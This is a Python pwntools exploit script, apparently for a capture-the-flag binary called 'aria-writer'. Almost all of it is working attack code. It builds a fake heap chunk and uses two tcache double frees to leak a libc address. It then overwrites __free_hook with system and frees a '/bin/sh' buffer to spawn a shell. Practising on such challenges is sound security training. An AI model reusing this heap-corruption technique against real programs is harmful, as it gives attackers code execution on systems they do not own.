#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template aria-writer
from pwn import *
import os

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./aria-writer')
libc = exe.libc

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

env = dict(os.environ)

# breakpoints just before free and malloc are called
# b *0x400a97
# b *0x400a1f
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start(env=env)

def malloc(size, content):
    io.sendlineafter('Gimme int pls > ', '1')
    io.sendlineafter('Gimme int pls > ', str(size))
    io.sendlineafter('what should i write tho > ', content)

def free():
    io.sendlineafter('Gimme int pls >', '2')

def secret_name():
    io.sendlineafter('Gimme int pls >', '3')

name_p = 0x6020e0
fake_chunk_p = name_p + 16

fake_chunk = fit({
    0x8: 0x91,
    0x90: 0x90,
    0x98: 0x11,
    0xa8: 0x11,
}, filler='\x00', length=0xc8)

io.sendafter('whats your name > ', fake_chunk)

# first double free
malloc(0x88, 'B'*8)
free()
free()

malloc(0x88, p64(fake_chunk_p))
malloc(0x88, 'C')
malloc(0x88, 'D')
free()

# libc leak
secret_name()
io.recvuntil('secret name o: :')
io.read(16)
leak = u64(io.read(8))
libc_addr = leak - 4111520
libc.address = libc_addr

log.success('libc @ %#x' % libc.address)

# second double free 
malloc(0x68, 'A')
free()
free()

malloc(0x68, flat(libc.symbols['__free_hook']))
malloc(0x68, 'B*8')
malloc(0x68, flat(libc.symbols['system']))

# trigger 
malloc(0x58, '/bin/sh\x00')
free()

io.interactive()


